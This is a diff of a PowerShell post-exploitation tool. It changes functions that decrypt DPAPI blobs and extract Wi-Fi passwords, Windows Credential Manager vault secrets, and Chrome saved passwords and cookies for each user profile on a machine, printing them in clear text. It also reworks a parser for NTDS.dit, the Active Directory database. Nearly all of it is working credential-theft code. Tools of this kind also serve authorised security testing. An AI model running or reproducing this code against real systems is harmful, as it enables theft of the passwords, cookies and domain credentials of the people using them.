+			ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x36) }
+			$IPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
+			$X = [byte[]]@()
+			ForEach ($i in $DerivedKey) { $X += ($i -bxor 0x5c) }
+			$OPAD = $X[0..$(($Global:ALGORITHMS_DATA[$HashAlgo])[4]-1)]
 
-	$ToHash = $IPAD + $HMAC
-	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
-	{
-		"SHA1" { $A = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
-		"SHA512" { $A = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
-	}
+			Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
+			{
+				"SHA1" { $X = [System.Security.Cryptography.SHA1]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA1]::Create().ComputeHash($OPAD) }
+				"SHA512" { $X = [System.Security.Cryptography.SHA512]::Create().ComputeHash($IPAD); $Y = [System.Security.Cryptography.SHA512]::Create().ComputeHash($OPAD) }
+			}
+			$DerivedKey = FixParity ($X + $Y)
+		}
 
-	$ToHash = $OPAD + $A
-	If ($Entropy) { $ToHash += $Entropy}
-	$ToHash += $ToSign
-	Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
-	{
-		"SHA1" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
-		"SHA512" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
-	}
+		$Key = $DerivedKey[0..$(($Global:ALGORITHMS_DATA[$CipherAlgo])[0]-1)]
+		$Mode = ($Global:ALGORITHMS_DATA[$CipherAlgo])[2]
+		$IV = (,([byte]0) * (($Global:ALGORITHMS_DATA[$CipherAlgo])[3]))
+		Switch ($CipherAlgo)
+		{
+			$Global:ALGORITHMS["CALG_3DES"] { $X = TripleDESTransform $Key $Data $IV $Mode $False }
+			$Global:ALGORITHMS["CALG_AES_256"] { $X = AESTransform $Key $Data $IV ([Security.Cryptography.CipherMode]::CBC) $False }
+		}
+		$ClearText = Unpad ($X)
 
-	$Hasher.Key = $MasterKeyHash
-	$ToHash = $HMAC
-	If ($Entropy) { $ToHash += $Entropy}
-	$ToHash += $ToSign
-	$HMAC_Calculated3 = $Hasher.ComputeHash($ToHash)
+		# Calculate the different HMACKeys
+		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
+		{
+			"SHA1" { $HashBlockSize = 64 }
+			"SHA512" { $HashBlockSize = 128 }
+		}
+		$MasterKeyHash2 = $MasterKeyHash + (,([byte]0) * $HashBlockSize)
+		$X = [byte[]]@()
+		ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x36) }
+		$IPAD = $X[0..$($HashBlockSize-1)]
+		$X = [byte[]]@()
+		ForEach ($i in $MasterKeyHash2) { $X += ($i -bxor 0x5c) }
+		$OPAD = $X[0..$($HashBlockSize-1)]
 
-	If ((@(Compare-Object $HMAC_Calculated1 $Signature -SyncWindow 0).Length -eq 0) -or (@(Compare-Object $HMAC_Calculated3 $Signature -SyncWindow 0).Length -eq 0))
-	{
-		return $ClearText
+		$ToHash = $IPAD + $HMAC
+		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
+		{
+			"SHA1" { $A = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
+			"SHA512" { $A = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
+		}
+
+		$ToHash = $OPAD + $A
+		If ($Entropy) { $ToHash += $Entropy}
+		$ToHash += $ToSign
+		Switch (($Global:ALGORITHMS_DATA[$HashAlgo])[1])
+		{
+			"SHA1" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA1]::Create().ComputeHash($ToHash) }
+			"SHA512" { $HMAC_Calculated1 = [System.Security.Cryptography.SHA512]::Create().ComputeHash($ToHash) }
+		}
+
+		$Hasher.Key = $MasterKeyHash
+		$ToHash = $HMAC
+		If ($Entropy) { $ToHash += $Entropy}
+		$ToHash += $ToSign
+		$HMAC_Calculated3 = $Hasher.ComputeHash($ToHash)
+
+		If ((@(Compare-Object $HMAC_Calculated1 $Signature -SyncWindow 0).Length -eq 0) -or (@(Compare-Object $HMAC_Calculated3 $Signature -SyncWindow 0).Length -eq 0))
+		{
+			return $ClearText
+		}
+		Else
+		{
+			return $Null
+		}
 	}
-	Else
-	{
-		return $Null
-	}
+	Else { return $ClearText }
 }
 
 <### Decrypt a credential file ###>
 
-function Decrypt-CredentialFile($FilePath, $MasterKeys)
+function Decrypt-CredentialFile($FilePath, $MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
 		Decrypt-CredentialFile:
@@ -4015,7 +4339,7 @@ function Decrypt-CredentialFile($FilePath, $MasterKeys)
 	$Unknown = [BitConverter]::ToUInt32($CFContent[8..11], 0)
 	$Data = $CFContent[12..$(12+$Size-1)]
 
-	$DecryptedBlob = Decrypt-DPAPIBlob $Data $MasterKeys $Null
+	$DecryptedBlob = Decrypt-DPAPIBlob $Data $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
 	If ($DecryptedBlob)
 	{
 		# Structure from Pypykatz DPAPI/Structures/CredentialFile.py : CREDBLOBTYPE
@@ -4121,12 +4445,13 @@ function Decrypt-CredentialFile($FilePath, $MasterKeys)
 	}
 }
 
-<### Find DPAPI secrets and try to decrypt them ###>
+<### Find DPAPI Secrets and try to decrypt them ###>
 
-function Get-WiFiPwds($MasterKeys)
+function Get-WiFiPwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
-		Get-WiFiPwds: With System MasterKeys we can always decrypt Wi-Fi pwds
+		Get-WiFiPwds:
+			- With System MasterKeys we can always decrypt Wi-Fi pwds
 			- Encrypted password for each Wireless interface and each SSID is located at C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\<IDForWirelessInterface>\<IDForSSID>.xml
 	#>
 	Write-Host ("[===] Searching Wi-Fi pwds and decrypt them with System's Master Keys [===]")
@@ -4151,7 +4476,7 @@ function Get-WiFiPwds($MasterKeys)
 						$KeyMaterial2 = $Content.IndexOf("</keyMaterial>")
 						$EncHexBlob = $Content.Substring($KeyMaterial1 + 13, $KeyMaterial2 - ($KeyMaterial1 + 13))
 						$EncBlob = HexStringToBytes $EncHexBlob
-						$BytesKey = Decrypt-DPAPIBlob $EncBlob $MasterKeys $Null
+						$BytesKey = Decrypt-DPAPIBlob $EncBlob $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
 						If ($BytesKey)
 						{
 							$StringKey = [System.Text.Encoding]::ASCII.GetString($BytesKey)
@@ -4159,7 +4484,7 @@ function Get-WiFiPwds($MasterKeys)
 						}
 						Else
 						{
-							Write-Host ("[-] No MasterKey found for decrypting key for SSID {0}" -f ($SSID))
+							Write-Host ("[-] No MasterKey found to decrypt key for SSID {0}" -f ($SSID))
 						}
 					}
 					Else
@@ -4175,11 +4500,11 @@ function Get-WiFiPwds($MasterKeys)
 	Write-Host ""
 }
 
-function Get-CredentialVaultManager($MasterKeys)
+function Get-CredentialVaultManager($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
 		Get-CredentialVaultManager:
-			1- Find all VPOL files and try to decrypt them with gathered MasterKeys
+			1- Find all VPOL files and try to decrypt them with gathered MasterKeys or in the context of the user
 			2- From decrypted VPOL files we get two keys for each
 			3- Find all VCRD files and try to decrypt them with each keys gained from VPOL files
 	#>
@@ -4265,7 +4590,7 @@ function Get-CredentialVaultManager($MasterKeys)
 		$X = $Y
 		$Y = $X + $KeySize
 		$DPAPIBlob = $VPOLBytes[$X..($Y-1)]
-		$VPOLDecrypted = Decrypt-DPAPIBlob $DPAPIBlob $MasterKeys $Null
+		$VPOLDecrypted = Decrypt-DPAPIBlob $DPAPIBlob $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
 		If ($VPOLDecrypted)
 		{
 			For ($i = 0; $i -lt 2; $i += 1)
@@ -4520,10 +4845,12 @@ function Get-CredentialVaultManager($MasterKeys)
 	#>
 }
 
-function Get-ChromePwds($MasterKeys)
+function Get-ChromePwds($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
-		Get-ChromePwds: Chrome Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them (We need their Pwd/NT Hash -> User PreKeys -> User MasterKeys)
+		Get-ChromePwds: Chrome Pwds/Cookies are encrypted with Users' MasterKeys, thus we cannot always decrypt them
+			- We need their Pwd/NT Hash -> User PreKeys -> User MasterKeys
+			- Or a session running as the user that own the Chrome secret
 			1- Found encrypted datas, many potential paths
 				- C:\Users\<User>\[Local/Roaming/LocalLow]\[""/Google]\Chome\User Data\[""/Default]\[Local State/Login Data/Cookies]
 				- "Local State" is a file that contain a key encrypted with DPAPI
@@ -4538,7 +4865,7 @@ function Get-ChromePwds($MasterKeys)
 					- Secret Pwd/Cookie = AES256-GCMDecrypt (SecretKey = LocalStateKey decrypted, IV = Nonce, AuthTag = Tag, AuthData = "", CipherText = CipherText)
 	#>
 	
-	Write-Host ("[===] Searching Chrome pwds/cookies and decrypt them with Users' Master Keys")
+	Write-Host ("[===] Searching Chrome pwds/cookies and decrypt them with Users' Master Keys [===]")
 
 	LoadSQLite
 
@@ -4643,6 +4970,15 @@ function Get-ChromePwds($MasterKeys)
 
 			ForEach ($TypeEncValues in $EncValues.Keys)
 			{
+				If ($TypeEncValues -eq "Pwds")
+				{
+					Write-Host("[+] Try to decrypt credentials for user {0}" -f ($UserName))
+				}
+				Else
+				{
+					Write-Host("[+] Try to decrypt cookies for user {0}" -f ($UserName))
+				}
+
 				For ($i = 0; $i -lt ($EncValues[$TypeEncValues]).Length; $i += 1)
 				{
 					# Chrome version >= v80
@@ -4650,7 +4986,7 @@ function Get-ChromePwds($MasterKeys)
 					{
 						If ($Results[$UserName]["EncLocalState"])
 						{
-							$Results[$UserName]["LocalState"] = Decrypt-DPAPIBlob $Results[$UserName]["EncLocalState"] $MasterKeys $Null
+							$Results[$UserName]["LocalState"] = Decrypt-DPAPIBlob $Results[$UserName]["EncLocalState"] $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
 							If ($Results[$UserName]["LocalState"])
 							{
 								$Nonce = $EncValues[$TypeEncValues][$i][3..14]
@@ -4663,42 +4999,42 @@ function Get-ChromePwds($MasterKeys)
 									$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
 									Switch ($TypeEncValues)
 									{
-										"Pwds" { Write-Host ("[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
-										"Cookies" { Write-Host ("[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+										"Pwds" { Write-Host ("`t[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+										"Cookies" { Write-Host ("`t[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
 									}
 								}
 								Catch
 								{
 									Write-Host ($_.Exception.Message)
-									Write-Host ("[-] AES256-GCM decryption of Chrome secret for user {0} failed" -f ($UserName))
+									Write-Host ("`t[-] AES256-GCM decryption of Chrome secret for user {0} failed" -f ($UserName))
 								}
 							}
 							Else
 							{
-								Write-Host ("[-] No MasterKey found to decrypt LocalState key for user {0}" -f ($UserName))
+								Write-Host ("`t[-] No MasterKey found to decrypt LocalState key for user {0}" -f ($UserName))
 							}
 						}
 						Else
 						{
-							Write-Host ("[-] No LocalState key found to decrypt Chrome secret for user {0}" -f ($UserName))
+							Write-Host ("`t[-] No LocalState key found to decrypt Chrome secret for user {0}" -f ($UserName))
 						}
 					}
 					# Chrome version < v80
 					Else
 					{
-						$ClearTextBytes = Decrypt-DPAPIBlob $EncValues[$TypeEncValues] $MasterKeys $Null
+						$ClearTextBytes = Decrypt-DPAPIBlob $EncValues[$TypeEncValues] $MasterKeys $Null $InUserContext $NoMasterKeysDecryption
 						If ($ClearTextBytes)
 						{
 							$ClearText = [System.Text.Encoding]::ASCII.GetString($ClearTextBytes)
 							Switch ($TypeEncValues)
 							{
-								"Pwds" { Write-Host ("[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
-								"Cookies" { Write-Host ("[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
+								"Pwds" { Write-Host ("`t[+] Found credentials {0}:{1} for {2}" -f ($ClearValues["Logins"][$i], $ClearText, $ClearValues["URLs"][$i])) }
+								"Cookies" { Write-Host ("`t[+] Found cookie {0}:{1}:{2}:{3}" -f ($ClearValues["Names"][$i], $ClearValues["HostKeys"][$i], $ClearValues["Paths"][$i], $ClearText)) }
 							}
 						}
 						Else
 						{
-							Write-Host ("[-] No MasterKey found to decrypt Chrome secret for user {0}" -f ($UserName))
+							Write-Host ("`t[-] No MasterKey found to decrypt Chrome secret for user {0}" -f ($UserName))
 						}
 					}
 				}
@@ -4710,29 +5046,43 @@ function Get-ChromePwds($MasterKeys)
 	Write-Host ""
 }
 
-function Get-DPAPISecrets($MasterKeys)
+function Get-DPAPISecrets($MasterKeys, $InUserContext, $NoMasterKeysDecryption)
 {
 	<#
-		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys
-			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed
-			- Decrypting Chrome secrets (cookies/pwds) require User Master Keys thus can failed (If user password/NT hash not provided)
-			- Decrypting VPOL Files with System and User MasterKeys -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
+		Get-DPAPISecrets: Get DPAPI Secrets and try to decrypt them with MasterKeys or in the context of the user
+			- Decrypting Wi-Fi passwords required System Master Keys thus It always succeed (as long as MasterKeys was computed)
+			- Decrypting Chrome secrets (cookies/pwds) require User Master Keys thus It can fail (If user password/NT hash not provided or current user not own the DPAPI Secret)
+			- Decrypting VPOL Files with System and User MasterKeys or in the context of the user -> Two VPOL Keys for each VPOL File decrypted -> Decrypt VCRD Files with VPOL Keys
 	#>
 
-	Get-WiFiPwds $MasterKeys
-	Get-ChromePwds $MasterKeys
-	Get-CredentialVaultManager $MasterKeys
+	Get-WiFiPwds $MasterKeys $InUserContext $NoMasterKeysDecryption
+	Get-ChromePwds $MasterKeys $InUserContext $NoMasterKeysDecryption
+	Get-CredentialVaultManager $MasterKeys $InUserContext $NoMasterKeysDecryption
 }
 
 <############>
 <# NTDS.dit #>
 <############>
 
+<###
+	Browse data functions
+###>
+
 $Global:PageTables = @{}
 $Global:CurrentTable = ""
 
 function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSize)
 {
+	<#
+		Try to translate a tag to a record
+		For Long Values tag, simply return the tag
+	#>
+
+	If (-not $FilterTables)
+	{
+		return $Tag
+	}
+
 	$Record = @{}
 	$TaggedItems = @()
 	$TaggedItemsParsed = $False
@@ -4869,7 +5219,7 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 
 		# Decode the data
 		# If we understand the data type, we unpack it and cast it accordingly
-        # otherwise, we just encode it in hex
+        # Otherwise, we just encode it in hex
 		$JET_coltypText = 10
 		$JET_coltypLongText = 12
 		If ($Record[$Column])
@@ -4957,8 +5307,15 @@ function TagToRecord($Cursor, $Tag, $FilterTables, $Version, $Revision, $PageSiz
 	return $Record
 }
 
-function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Version, $Revision, $PageSize)
+function GetNextRow($NTDSContent, $Cursor, $FilterTables, $Version, $Revision, $PageSize)
 {
+	<#
+		Increase the current tag number
+		Get the current tag on the current page record
+		If no tag, callback GetNextRow with the next page record
+		Else return the tag translated into record
+	#>
+	
 	$Cursor["CurrentTag"] += 1
 
 	# Get next tag
@@ -4971,7 +5328,13 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 	}
 	Else
 	{
-		$PageFlags, $TagData = GetTag $PageData $PageRecord $Cursor["CurrentTag"] $PageRecordLength $Version $Revision $PageSize
+		# Get tag flags and tag data
+		$TagFlags, $TagData = GetTag $PageData $PageRecord $Cursor["CurrentTag"] $Cursor["PageRecordLength"] $Version $Revision $PageSize $Cursor["PageNum"]
+		$FLAGS_LEAF = 2
+		$FLAGS_SPACE_TREE = 0x20
+		$FLAGS_INDEX = 0x40
+		$FLAGS_LONG_VALUE = 0x80
+
 		If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -gt 0)
 		{
 			# Leaf Page
@@ -4987,18 +5350,35 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 			}
 			ElseIf (($PageRecord["PageFlags"] -band $FLAGS_LONG_VALUE) -gt 0)
 			{
-				Write-Host "`t[-] FLAGS_LONG_VALUE exception"
-				return $Null
-			}
-			Else
-			{
-				# Table Value
-
 				# Structure from Impacket "ese.py" : ESENT_LEAF_ENTRY
 				$LeafEntry = @{}
 				$TAG_COMMON = 4
 				$Start = 0
-				If (($PageFlags -band $TAG_COMMON) -gt 0)
+				If (($TagFlags -band $TAG_COMMON) -gt 0)
+				{
+					# Include the common header
+					$LeafEntry["CommonPageKeySize"] = [BitConverter]::ToUInt16($TagData[0..1], 0)
+					$Start = 2
+				}
+
+				$LeafEntry["LocalPageKeySize"] = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
+				$X = $Start + 2
+				$Y = $X + $LeafEntry["LocalPageKeySize"]
+				$LeafEntry["LocalPageKey"] = $TagData[$X..($Y-1)]
+				$X = $Y
+				$Y = $TagData.Length
+				$LeafEntry["EntryData"] = $TagData[$X..($Y-1)]
+
+				$Tag = $LeafEntry
+				return (TagToRecord $Cursor $Tag $FilterTables $Version $Revision $PageSize)
+			}
+			Else
+			{
+				# Structure from Impacket "ese.py" : ESENT_LEAF_ENTRY
+				$LeafEntry = @{}
+				$TAG_COMMON = 4
+				$Start = 0
+				If (($TagFlags -band $TAG_COMMON) -gt 0)
 				{
 					# Include the common header
 					$LeafEntry["CommonPageKeySize"] = [BitConverter]::ToUInt16($TagData[0..1], 0)
@@ -5030,9 +5410,10 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 		}
 		Else
 		{
-			$Cursor["CurrentPageData"], $Cursor["CurrentPageRecord"], $PageRecordLength = GetPageRecord $NTDSContent $PageRecord["NextPageNumber"] $Version $Revision $PageSize
+			$Cursor["CurrentPageData"], $Cursor["CurrentPageRecord"], $Cursor["PageRecordLength"] = GetPageRecord $NTDSContent $PageRecord["NextPageNumber"] $Version $Revision $PageSize
+			$Cursor["PageNum"] = $PageRecord["NextPageNumber"]
 			$Cursor["CurrentTag"] = 0
-			return (GetNextRow $NTDSContent $Cursor $FilterTables $PageRecordLength $Version $Revision $PageSize)
+			return (GetNextRow $NTDSContent $Cursor $FilterTables $Version $Revision $PageSize)
 		}
 	}
 	Else
@@ -5041,23 +5422,157 @@ function GetNextRow($NTDSContent, $Cursor, $FilterTables, $PageRecordLength, $Ve
 	}
 }
 
-function GetTag($PageData, $PageRecord, $TagNum, $PageRecordLength, $Version, $Revision, $PageSize)
+function GetCursor($NTDSContent, $Version, $FileFormatRevision, $PageSize, $TableName, $CatalogType)
 {
+	<#
+		Get the entry with the table name and catalog type from the global page tables
+		While (True)
+			- Get the page record from the page number
+			- If no tags on this page -> No records at all for this table and catalog type -> Break
+			- Else
+				- For all tags
+					- If the page is a leaf It contain metadata information and this is not desired -> Set the page number to the child page from the tag and Break
+					- Else, we can use this page record for the cursor
+	#>
+	
+	$Entry = $Global:PageTables[$TableName][$CatalogType]
+
+	# Structure from Impacket "ese.py" : ESENT_DATA_DEFINITION_HEADER
+	$DataDefinitionHeader = @{}
+	$DataDefinitionHeader["LastFixedSize"] = [UInt32]($Entry["EntryData"][0])
+	$DataDefinitionHeader["LastVariableDataType"] = [UInt32]($Entry["EntryData"][1])
+	$DataDefinitionHeader["VariableSizeOffset"] = [BitConverter]::ToUInt16($Entry["EntryData"][2..3], 0)
+
+	# Structure from Impacket "ese.py" : ESENT_CATALOG_DATA_DEFINITION_ENTRY
+	$CatalogEntry = @{}
+	$CatalogEntry["FatherPageID"] = [BitConverter]::ToUInt32($Entry["EntryData"][4..7], 0)
+	$CatalogEntry["Type"] = [BitConverter]::ToUInt16($Entry["EntryData"][8..9], 0)
+	$CatalogEntry["Identifier"] = [BitConverter]::ToUInt32($Entry["EntryData"][10..13], 0)
+
+	$CATALOG_TYPE_TABLE = 1
+	$CATALOG_TYPE_COLUMN = 2
+	$CATALOG_TYPE_INDEX = 3
+	$CATALOG_TYPE_LONG_VALUE = 4
+	$CATALOG_TYPE_CALLBACK = 5
+	If ($CatalogEntry["Type"] -eq $CATALOG_TYPE_TABLE)
+	{
+		$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
+		$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
+		$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
+	}
+	ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
+	{
+		$CatalogEntry["ColumnType"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
+		$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
+		$CatalogEntry["ColumnFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
+		$CatalogEntry["CodePage"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
+		$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
+	}
+	ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_INDEX)
+	{
+		$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
+		$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
+		$CatalogEntry["IndexFlags"] = [BitConverter]::ToUInt32($Entry["EntryData"][22..25], 0)
+		$CatalogEntry["Locale"] = [BitConverter]::ToUInt32($Entry["EntryData"][26..29], 0)
+		$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
+	}
+	ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_LONG_VALUE)
+	{
+		$CatalogEntry["FatherDataPageNumber"] = [BitConverter]::ToUInt32($Entry["EntryData"][14..17], 0)
+		$CatalogEntry["SpaceUsage"] = [BitConverter]::ToUInt32($Entry["EntryData"][18..21], 0)
+		$CatalogEntry["Trailing"] = $Entry["EntryData"][22..($Entry["EntryData"].Length-1)]
+	}
+	ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_CALLBACK) { Write-Host "`t[-] Callback type not supported"; Return $Null }
+	Else { Write-Host ("`t[-] Unknown catalog type 0x{0:X2}" -f ($CatalogEntry["DataType"])); Return $Null }
+
+	$PageNum = $CatalogEntry["FatherDataPageNumber"]
+	$Done = $False
+	While ($Done -eq $False)
+	{
+		$PageData, $PageRecord, $PageRecordLength = GetPageRecord $NTDSContent $PageNum $Version $FileFormatRevision $PageSize
+		If ($PageRecord["FirstAvailablePageTag"] -le 1)
+		{
+			# There are no records
+			$Done = $True
+		}
+
+		For ($i = 1; $i -lt $PageRecord["FirstAvailablePageTag"]; $i += 1)
+		{
+			$TagFlags, $TagData = GetTag $PageData $PageRecord $i $PageRecordLength $Version $FileFormatRevision $PageSize $PageNum
+			$FLAGS_LEAF = 2
+			If (($PageRecord["PageFlags"] -band $FLAGS_LEAF) -eq 0)
+			{
+				# We don't want a leaf to recover data (leaf is for metadata)
+				# Thus get child page and continue
+
+				# Structure from Impacket "ese.py" : ESENT_BRANCH_ENTRY
+				$TAG_COMMON = 4
+				$Start = 0
+				If (($TagFlags -band $TAG_COMMON) -gt 0)
+				{
+					# Include the common header
+					$CommonPageKeySize = [BitConverter]::ToUInt16($TagData[0..1], 0)
+					$Start = 2
+				}
+
+				$LocalPageKeySize = [BitConverter]::ToUInt16($TagData[$Start..($Start + 2)], 0)
+				$X = $Start + 2
+				$Y = $X + $LocalPageKeySize
+				$LocalPageKey = $TagData[$X..($Y-1)]
+				$X = $Y
+				$Y = $X + 4
+				$ChildPageNumber = [BitConverter]::ToUInt32($TagData[$X..($Y-1)], 0)
+
+				$PageNum = $ChildPageNumber
+				Break
+			}
+			Else { $Done = $True; Break }
+		}
+	}
+
+	$Cursor = @{}
+	$Cursor["TableData"] = $Global:PageTables[$TableName]
+	$Cursor["FatherDataPageNumber"] = $CatalogEntry["FatherDataPageNumber"]
+	$Cursor["CurrentPageRecord"] = $PageRecord
+	$Cursor["CurrentPageData"] = $PageData
+	$Cursor["PageRecordLength"] = $PageRecordLength
+	$Cursor["PageNum"] = $PageNum
+	$Cursor["CurrentTag"] = 0
+
+	return $Cursor
+}
+
+<###
+	Parsing catalog functions
+###>
+
+function GetTag($PageData, $PageRecord, $TagNum, $PageRecordLength, $Version, $Revision, $PageSize, $PageNum)
+{
+	<#
+		A tag header is 4 bytes and contain pointers (size, offset) to the tag data into the page
+		All tag headers are at the end of the page in reverse order
+			- Last tag header at (the end of the page - (4 * $PageRecord["FirstAvailablePageTag"]))
+			- First tag header at the end of the page
+	#>
+
+	# Get all tag headers
 	$Tags = $PageData[($PageData.Length - (4 * $PageRecord["FirstAvailablePageTag"]))..($PageData.Length-1)]
 	$BaseOffset = $PageRecordLength
 
+	# Get the requested tag header by iterated from the end 
 	For ($i = 0; $i -lt $TagNum; $i += 1)
 	{
 		$Tags = $Tags[0..($Tags.Length - 4 - 1)]
 	}
 	$Tag = $Tags[($Tags.Length - 4)..($Tags.Length-1)]
 
+	# Parse the tag header and get the data from pointers (size, offset) into page
 	If (($Version -eq 0x620) -and ($Revision -ge 17) -and ($PageSize -gt 8192))
 	{
 		$ValueSize = [BitConverter]::ToUInt16($Tag[0..1], 0) -band 0x7FFF
 		$ValueOffset = [BitConverter]::ToUInt16($Tag[2..3], 0) -band 0x7FFF
 		$TMPData = $PageData[($BaseOffset + $ValueOffset)..($BaseOffset + $ValueOffset + $ValueSize - 1)]
-		$PageFlags = Shift $TMPData[1] -5
+		$TagFlags = Shift $TMPData[1] -5
 		$TMPData[1] = $TMPData[1] -band 0x1F
 		$TagData = $TMPData
 	}
@@ -5065,20 +5580,28 @@ function GetTag($PageData, $PageRecord, $TagNum, $PageRecordLength, $Version, $R
 	{
 		$ValueSize = [BitConverter]::ToUInt16($Tag[0..1], 0) -band 0x1FFF
 		$ValueOffset = [BitConverter]::ToUInt16($Tag[2..3], 0) -band 0x1FFF
-		$PageFlags = Shift ([BitConverter]::ToUInt16($Tag[2..3], 0) -band 0xE000) -13
+		$TagFlags = Shift ([BitConverter]::ToUInt16($Tag[2..3], 0) -band 0xE000) -13
 		$TagData = $PageData[($BaseOffset + $ValueOffset)..($BaseOffset + $ValueOffset + $ValueSize - 1)]
 	}
 
-	return ($PageFlags, $TagData)
+	return ($TagFlags, $TagData)
 }
 
-function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $Revision, $PageSize)
+function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $Revision, $PageSize, $PageNum)
 {
+	<#
+		For all tags of the page
+			- If the page is a leaf
+				- If the page is a table value
+					- Parse the tag data depending on the tag data type
+						- Populate the global page tables accordingly
+	#>
+
 	# Iterate over all tags of the page
 	For ($TagNum = 1; $TagNum -lt $PageRecord["FirstAvailablePageTag"]; $TagNum += 1)
 	{
-		# Get page flags and tag data
-		$PageFlags, $TagData = GetTag $PageData $PageRecord $TagNum $PageRecordLength $Version $Revision $PageSize
+		# Get tag flags and tag data
+		$TagFlags, $TagData = GetTag $PageData $PageRecord $TagNum $PageRecordLength $Version $Revision $PageSize $PageNum
 		$FLAGS_LEAF = 2
 		$FLAGS_SPACE_TREE = 0x20
 		$FLAGS_INDEX = 0x40
@@ -5098,7 +5621,7 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 				# Structure from Impacket "ese.py" : ESENT_LEAF_ENTRY
 				$TAG_COMMON = 4
 				$Start = 0
-				If (($PageFlags -band $TAG_COMMON) -gt 0)
+				If (($TagFlags -band $TAG_COMMON) -gt 0)
 				{
 					# Include the common header
 					$LeafEntry["CommonPageKeySize"] = [BitConverter]::ToUInt16($TagData[0..1], 0)
@@ -5174,7 +5697,7 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 					$Global:PageTables[$ItemName]["TableEntry"] = $LeafEntry
 					$Global:PageTables[$ItemName]["Columns"] = @{}
 					$Global:PageTables[$ItemName]["Indexes"] = @{}
-					$Global:PageTables[$ItemName]["LongValues"] = @{}
+					$Global:PageTables[$ItemName]["LongValues"] = $Null
 					$Global:CurrentTable = $ItemName
 				}
 				ElseIf ($CatalogEntry["Type"] -eq $CATALOG_TYPE_COLUMN)
@@ -5191,7 +5714,7 @@ function ParsePageRecord($PageData, $PageRecord, $PageRecordLength, $Version, $R
 				{
 					$lvLen = [BitConverter]::ToUInt16($LeafEntry["EntryData"][$DataDefinitionHeader["VariableSizeOffset"]..($DataDefinitionHeader["VariableSizeOffset"]+1)], 0)
